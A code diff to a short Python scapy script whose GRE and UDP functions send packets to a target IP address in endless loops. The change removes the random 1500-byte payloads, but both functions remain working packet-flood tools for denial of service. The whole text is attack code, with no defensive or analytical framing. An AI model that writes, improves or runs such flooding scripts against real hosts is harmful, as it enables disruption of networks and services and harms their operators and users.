@@ -4,14 +4,14 @@ import os
 from scapy.all import *
 
 def gre(tgt_ip):
-    data = os.urandom(1500)
-    p = IP(dst=tgt_ip)/GRE()/Raw(load=data)
+   
+    p = IP(dst=tgt_ip)/GRE()
     print ("Sending GRE packets")
     while True:
         send(p, count = 100, verbose = 0)
 def udp(tgt_ip):
-    data = os.urandom(1500)
-    p = IP(dst=tgt_ip)/UDP()/Raw(load=data)
+    
+    p = IP(dst=tgt_ip)/UDP()
     print ("Sending UPD packets")
     while True:
         send(p, count = 100, verbose = 0)
